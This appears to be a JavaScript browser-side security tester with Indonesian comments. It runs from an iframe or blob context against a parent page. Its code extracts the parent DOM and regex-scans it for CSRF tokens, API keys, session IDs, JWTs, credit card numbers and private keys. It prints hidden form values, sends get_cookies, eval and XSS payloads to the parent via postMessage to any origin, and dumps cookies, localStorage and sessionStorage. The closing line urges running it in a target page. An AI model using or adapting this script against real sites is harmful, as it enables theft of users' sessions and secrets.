/**
 * =============================================================================
 *  Parent Page Inspector v1.0 - Blob Context Security Tester
 * =============================================================================
 * Tujuan:
 * 1. Menguji komunikasi dengan halaman induk (parent window)
 * 2. Mendeteksi kerentanan postMessage 
 * 3. Mengekstrak data sensitif dari parent DOM
 * 4. Menguji bypass CSP dengan blob loading
 * 5. Menguji frame-busting bypass
 * =============================================================================
 */

(function() {
    if (typeof log === 'undefined') {
        console.error('ERROR: Parent Page Inspector harus dijalankan di dalam Interactive Workbench.');
        return;
    }

    log.info('=== PARENT PAGE INSPECTOR v1.0 ===');
    
    // 1. Test Parent Window Access
    function testParentAccess() {
        log.info('--- Testing Parent Window Access ---');
        
        try {
            if (window.parent && window.parent !== window) {
                log.success('✅ Parent window detected!');
                
                // Test same-origin access
                try {
                    const parentURL = window.parent.location.href;
                    log.success(`✅ Same-origin access: ${parentURL}`);
                    
                    // Extract parent DOM if accessible
                    try {
                        const parentDOM = window.parent.document.documentElement.outerHTML;
                        log.success('✅ Parent DOM accessible! Extracting sensitive data...');
                        extractSensitiveData(parentDOM);
                    } catch (e) {
                        log.warn('⚠️ Parent DOM tidak dapat diakses: ' + e.message);
                    }
                } catch (e) {
                    log.warn('⚠️ Cross-origin restriction: ' + e.message);
                    log.info('ℹ️ Attempting postMessage communication...');
                    testPostMessage();
                }
            } else {
                log.warn('⚠️ Tidak ada parent window atau running sebagai top-level');
            }
        } catch (e) {
            log.error('❌ Error testing parent access: ' + e.message);
        }
    }

    // 2. Test postMessage Communication
    function testPostMessage() {
        log.info('--- Testing postMessage Communication ---');
        
        // Listen for messages from parent
        const messageListener = function(event) {
            log.success(`📨 Message received from ${event.origin}:`);
            log.info(`Data: ${JSON.stringify(event.data)}`);
            log.info(`Source: ${event.source === window.parent ? 'Parent Window' : 'Other Window'}`);
        };
        
        window.addEventListener('message', messageListener);
        
        // Send test messages to parent
        if (window.parent && window.parent !== window) {
            const testPayloads = [
                { type: 'ping', data: 'Console Hunter Test' },
                { type: 'request', action: 'get_cookies' },
                { type: 'request', action: 'get_localStorage' },
                { type: 'request', action: 'get_sessionStorage' },
                { type: 'eval', code: 'document.title' },
                { type: 'xss_test', payload: '<script>alert("XSS")</script>' }
            ];
            
            testPayloads.forEach((payload, index) => {
                setTimeout(() => {
                    try {
                        window.parent.postMessage(payload, '*');
                        log.info(`📤 Sent test payload ${index + 1}: ${JSON.stringify(payload)}`);
                    } catch (e) {
                        log.error(`❌ Failed to send payload ${index + 1}: ${e.message}`);
                    }
                }, index * 1000);
            });
        }
        
        // Clean up listener after 10 seconds
        setTimeout(() => {
            window.removeEventListener('message', messageListener);
            log.info('🧹 postMessage listener removed');
        }, 10000);
    }

    // 3. Extract Sensitive Data from DOM
    function extractSensitiveData(html) {
        log.info('--- Extracting Sensitive Data ---');
        
        // Create temporary DOM to parse HTML
        const tempDiv = document.createElement('div');
        tempDiv.innerHTML = html;
        
        // Look for sensitive patterns
        const sensitivePatterns = {
            'CSRF Tokens': /name=["\']?(_token|csrf_token|authenticity_token)["\']?\s+value=["\']([^"\']+)["\']|content=["\']([^"\']+)["\'].*name=["\']?csrf["\']?/gi,
            'API Keys': /api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{20,})["\']|key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{32,})["\']|token["\']?\s*[:=]\s*["\']([a-zA-Z0-9_.-]{20,})["\']|bearer["\'\s]+([a-zA-Z0-9_.-]{20,})/gi,
            'Session IDs': /session[_-]?id["\']?\s*[:=]\s*["\']([^"\']+)["\']|PHPSESSID=([^;]+)|jsessionid=([^;]+)/gi,
            'JWT Tokens': /eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/gi,
            'Email Addresses': /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/gi,
            'Credit Card Numbers': /\b(?:\d{4}[\s-]?){3}\d{4}\b/gi,
            'Private Keys': /-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z ]*PRIVATE KEY-----/gi
        };
        
        Object.entries(sensitivePatterns).forEach(([type, pattern]) => {
            const matches = html.match(pattern);
            if (matches) {
                log.warn(`🔍 Found ${type}:`);
                matches.forEach((match, index) => {
                    if (index < 5) { // Limit output
                        log.info(`  ${index + 1}: ${match.substring(0, 100)}${match.length > 100 ? '...' : ''}`);
                    }
                });
                if (matches.length > 5) {
                    log.info(`  ... and ${matches.length - 5} more`);
                }
            }
        });

        // Look for forms
        const forms = tempDiv.querySelectorAll('form');
        if (forms.length > 0) {
            log.info(`📋 Found ${forms.length} form(s):`);
            forms.forEach((form, index) => {
                const action = form.getAttribute('action') || 'current page';
                const method = form.getAttribute('method') || 'GET';
                log.info(`  Form ${index + 1}: ${method} -> ${action}`);
                
                // Check for hidden inputs
                const hiddenInputs = form.querySelectorAll('input[type="hidden"]');
                hiddenInputs.forEach(input => {
                    const name = input.getAttribute('name');
                    const value = input.getAttribute('value');
                    if (name && value) {
                        log.info(`    Hidden: ${name} = ${value}`);
                    }
                });
            });
        }
    }

    // 4. Test CSP Bypass Detection
    function testCSPBypass() {
        log.info('--- Testing CSP Bypass with Blob Loading ---');
        
        // Check if we're loaded as blob
        if (window.location.protocol === 'blob:') {
            log.success('✅ Running in blob context - potential CSP bypass!');
            
            // Test script execution
            try {
                const testScript = `
                    console.log('CSP Bypass Test: Script execution successful');
                    if (typeof log !== 'undefined') {
                        log.success('✅ CSP Bypass confirmed - JavaScript execution in blob context');
                    }
                `;
                eval(testScript);
            } catch (e) {
                log.error('❌ Script execution blocked: ' + e.message);
            }
            
            // Test external resource loading
            testExternalResourceLoading();
        } else {
            log.info('ℹ️ Not running in blob context');
        }
    }

    // 5. Test External Resource Loading
    function testExternalResourceLoading() {
        log.info('--- Testing External Resource Loading ---');
        
        const testURL = 'https://httpbin.org/get';
        
        // Test fetch
        fetch(testURL)
            .then(response => {
                log.success('✅ Fetch request successful - external connectivity available');
                return response.json();
            })
            .then(data => {
                log.info('Response data received');
                if (data.origin) {
                    log.info(`🌐 External IP: ${data.origin}`);
                }
            })
            .catch(error => {
                log.error('❌ Fetch request failed: ' + error.message);
            });
    }

    // 6. Test Frame Busting Bypass
    function testFrameBustingBypass() {
        log.info('--- Testing Frame Busting Bypass ---');
        
        if (window.top !== window.self) {
            log.info('🖼️ Running in frame/iframe context');
            
            // Common frame busting techniques to test against
            const frameBustingTests = [
                'window.top.location = window.self.location',
                'if (top !== self) { top.location = self.location }',
                'if (parent.frames.length > 0) { top.location = self.location }',
                'if (window.top !== window.self) { window.top.location.href = window.self.location.href }'
            ];
            
            log.info('🧪 Testing against common frame busting techniques:');
            frameBustingTests.forEach((test, index) => {
                log.info(`  ${index + 1}. ${test}`);
            });
            
            // Test if frame busting is active
            setTimeout(() => {
                if (window.top === window.self) {
                    log.warn('⚠️ Frame busting detected - page broke out of frame');
                } else {
                    log.success('✅ Frame busting bypass successful - still in frame');
                }
            }, 2000);
        } else {
            log.info('ℹ️ Not running in frame context');
        }
    }

    // 7. Cookie and Session Analysis
    function analyzeCookiesAndSessions() {
        log.info('--- Cookie and Session Analysis ---');
        
        const cookies = document.cookie;
        if (cookies) {
            log.info('🍪 Cookies found:');
            cookies.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                log.info(`  ${name}: ${value ? value.substring(0, 50) + (value.length > 50 ? '...' : '') : '(empty)'}`);
                
                // Check for security flags
                if (name.toLowerCase().includes('session')) {
                    log.warn(`🔐 Session cookie detected: ${name}`);
                }
            });
        } else {
            log.info('ℹ️ No cookies found');
        }
        
        // Check localStorage
        try {
            const localStorageKeys = Object.keys(localStorage);
            if (localStorageKeys.length > 0) {
                log.info('💾 localStorage data:');
                localStorageKeys.forEach(key => {
                    const value = localStorage.getItem(key);
                    log.info(`  ${key}: ${value ? value.substring(0, 50) + (value.length > 50 ? '...' : '') : '(empty)'}`);
                });
            } else {
                log.info('ℹ️ No localStorage data found');
            }
        } catch (e) {
            log.error('❌ Cannot access localStorage: ' + e.message);
        }
        
        // Check sessionStorage
        try {
            const sessionStorageKeys = Object.keys(sessionStorage);
            if (sessionStorageKeys.length > 0) {
                log.info('🗂️ sessionStorage data:');
                sessionStorageKeys.forEach(key => {
                    const value = sessionStorage.getItem(key);
                    log.info(`  ${key}: ${value ? value.substring(0, 50) + (value.length > 50 ? '...' : '') : '(empty)'}`);
                });
            } else {
                log.info('ℹ️ No sessionStorage data found');
            }
        } catch (e) {
            log.error('❌ Cannot access sessionStorage: ' + e.message);
        }
    }

    // Main execution
    log.info('🚀 Starting Parent Page Security Assessment...');
    
    testParentAccess();
    setTimeout(() => testCSPBypass(), 1000);
    setTimeout(() => testFrameBustingBypass(), 2000);
    setTimeout(() => analyzeCookiesAndSessions(), 3000);
    
    log.info('⏱️ Assessment running... Results will appear above.');
    log.info('📝 Run this script when the workbench is loaded as a blob in a target page for maximum effectiveness.');
})();